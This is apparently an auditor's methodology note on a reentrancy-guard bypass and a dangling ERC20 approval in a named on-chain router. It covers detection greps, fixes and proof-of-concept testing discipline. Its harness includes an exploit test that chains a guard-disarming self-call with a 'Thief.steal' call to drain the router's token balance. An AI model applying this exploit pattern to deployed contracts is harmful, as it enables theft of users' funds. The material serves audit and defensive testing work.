# Reentrancy-guard bypass & dangling approval — audit + PoC discipline

Two variants that §7 (REENTRANCY) does not cover, plus the PoC traps that make a
harness *look* like it proves something when it doesn't.

Discovered 2026-10-08 auditing a permissionless router (Relay v3 `RelayRouterV3`,
`0xb92fe925…`) whose guard is `ReentrancyGuardMsgSender` with transient storage.

---

## 1. Non-depth-counted guard → the guard can be DISARMED

### The shape

```solidity
modifier nonReentrant() { _nonReentrantBefore(); _; _nonReentrantAfter(); }

function _nonReentrantBefore() private {
    address sender = msg.sender;
    address stored;
    assembly { stored := tload(SLOT) }
    if (stored != address(0) && stored != sender && sender != address(this)) {
        revert InvalidMsgSender(stored, sender);
    }
    assembly { tstore(SLOT, sender) }
}

function _nonReentrantAfter() private {
    assembly { tstore(SLOT, 0) }        // <-- WRITES ZERO, does not restore
}
```

Three things combine into a defect:

1. The check only tests `stored != address(0)` — **zero means "not entered"**.
2. `_nonReentrantAfter()` **writes 0 unconditionally** instead of restoring the
   previous value, so it is not a depth counter.
3. A **self-call is explicitly allowed** (`sender != address(this)` is a permitted
   branch), so the guarded function can be entered recursively from inside itself.

⇒ If any nested nonReentrant call **completes** during an outer nonReentrant call,
the slot is zeroed. From that point on the guard is **disarmed for the rest of the
transaction** and *any address* may reenter.

### Why the trigger is the normal usage pattern, not an exotic one

The self-call that disarms the guard is usually the contract's own documented
"cleanup / refund / settle" step, invoked as a call whose `target` is the contract
itself. In a `multicall`-style router that reads as:

```solidity
calls[0] = Call3Value(router, false, 0, abi.encodeCall(IRouter.cleanupNative, (0, user, "")));
calls[1] = Call3Value(someThirdParty, false, 0, ...);   // now unguarded
```

### Grep for it

```bash
# guards that zero instead of restoring, and are therefore not depth counters
grep -rn "tstore\|_nonReentrantAfter\|nonReentrant" contracts/ -A6 | grep -iE "tstore|sstore|= 0"
# any self-allowance branch in the entry check
grep -rn "address(this)" contracts/ -B6 | grep -iE "nonReentrant|InvalidMsgSender|storedSender"
# multicall/aggregate loops that let the caller aim a call at the contract itself
grep -rn "function multicall\|_aggregate\|call\{value" contracts/ -A12
```

### Fix

Restore the previous value rather than writing zero, or keep an explicit depth
counter — and drop the `sender == address(this)` allowance unless it is provably
needed (it is what makes the self-call entry possible at all).

---

## 2. Dangling approval: `approve()` granted, never revoked

```solidity
function cleanupErc20sViaCall(address[] tokens, address[] tos, bytes[] datas, uint256[] amounts) public nonReentrant {
    for (uint256 i; i < tokens.length; i++) {
        uint256 amount = amounts[i] == 0
            ? IERC20(tokens[i]).balanceOf(address(this))   // "full balance"
            : amounts[i];                                   // <-- NO balance check
        if (amount > 0) {
            IERC20(tokens[i]).approve(tos[i], amount);       // <-- persists after the tx
            (bool ok,) = tos[i].call(datas[i]);
            if (!ok) revert CallFailed();
        }
    }
}
```

Two independent problems:

- **An explicit `amounts[i]` bypasses the balance test.** With `type(uint256).max`
  and an empty contract, `approve` still succeeds — the contract hands out an
  unlimited allowance while holding nothing, so nothing looks wrong afterwards.
- **The allowance is never reset to 0**, so it outlives the transaction and any
  later inbound balance becomes spendable by the approved address.

Also note `approve`'s return value is unchecked — a non-standard token returning
`false` is silently ignored.

Honest severity note: if the contract also exposes a permissionless "send my whole
balance to X" function, the marginal gain of the dangling approval is small. Say so
rather than inflating it. The durable part is the **unbounded, permanent,
zero-cost capability grant**, which matters whenever the contract is funded later.

---

## 3. PoC discipline — the two traps that make a harness lie

### Trap A: a reentrant probe that fails for the wrong reason

```solidity
// WRONG — "reentry reverted" is read as "the guard held"
try router.cleanupErc20s(tokens, tos, amts, "") { reentered = true; }
catch { reentryReverted = true; }
```

If the call BODY reverts (e.g. `safeTransfer` with a zero balance), `catch` fires
and the test reads as *guard held*. It proves nothing about the guard.

**The probe's reentrant call must SUCCEED when the guard allows it.** Use a no-op
that cannot fail on the current state — `cleanupNative(0, recipient, "")` with an
empty native balance is exactly that.

```solidity
// RIGHT — success/failure now isolates the GUARD
try router.cleanupNative(0, address(this), "") { reentered = true; }
catch { reentryReverted = true; }
```

### Trap B: no control test ⇒ no causation

A single "it worked" test cannot distinguish the trigger from coincidence. Always
ship the pair, identical except for the trigger:

| test | trigger present | expected |
|---|---|---|
| `test_control_*` | no  | guard HOLDS, funds safe |
| `test_defect_*` / `test_*_exploit` | yes | guard bypassed, impact observed |

Observed on the real target: control **blocked** the reentry, the self-call variant
**did not** — that difference is the finding.

### Trap C: assert the OBSERVED behaviour, not the desired one

A test that `revert`s when the bug is present reads as a red suite, which future
readers will "fix" by weakening it. Instead assert the buggy behaviour and let the
comment say what to do when it changes:

```solidity
require(probe.reentered(), "guard held - if this fails the defect is FIXED, update the finding");
```

Now the suite is green, pins the defect, and **fails loudly on the day it is fixed**.

### Trap D: hard-coded victim/probe must not be the only allowed sender

The guard's allowed set is `{original caller, address(this)}`. A probe that is
neither will be rejected for a reason unrelated to the defect you are testing —
choose the self-call (`target == router`) as the disarm trigger, and let the probe
be a genuinely unrelated third party.

### Minimal harness skeleton

```solidity
// 1. control — no trigger
function test_control_guardHolds() public {
    Call3Value[] memory c = new Call3Value[](1);
    c[0] = Call3Value(address(thief), true, 0, abi.encodeCall(Thief.steal, ()));
    router.multicall(c, address(this), address(0), "");
    require(thief.stolen() == 0, "control invalid: succeeded without the trigger");
    require(token.balanceOf(address(router)) == START, "control: funds must remain");
}

// 2. exploit — trigger then impact, both asserted in one tx
function test_exploit_disarmsGuardAndSteals() public {
    Call3Value[] memory c = new Call3Value[](2);
    c[0] = Call3Value(address(router), false, 0,           // the self-call that disarms
                      abi.encodeWithSignature("cleanupNative(uint256,address,bytes)", 0, address(this), ""));
    c[1] = Call3Value(address(thief), false, 0, abi.encodeCall(Thief.steal, ()));
    router.multicall(c, address(this), address(0), "");
    require(thief.stolen() == START, "impact not demonstrated");
    require(token.balanceOf(address(router)) == 0, "funds not moved");
}
```

---

## 4. Verify against the LIVE variant before reporting

Protocols ship several guards/branches — e.g. a transient-storage build and a
`_NonTstore` (**storage**) fallback. The storage variant resets to a persisted 0,
and `multicall`-batched calls behave differently. Decide which one is deployed
(`live-vs-source-bytecode-forensics`) before you claim the guard is disarmable;
the POC must target the deployed code path, not the convenient one.
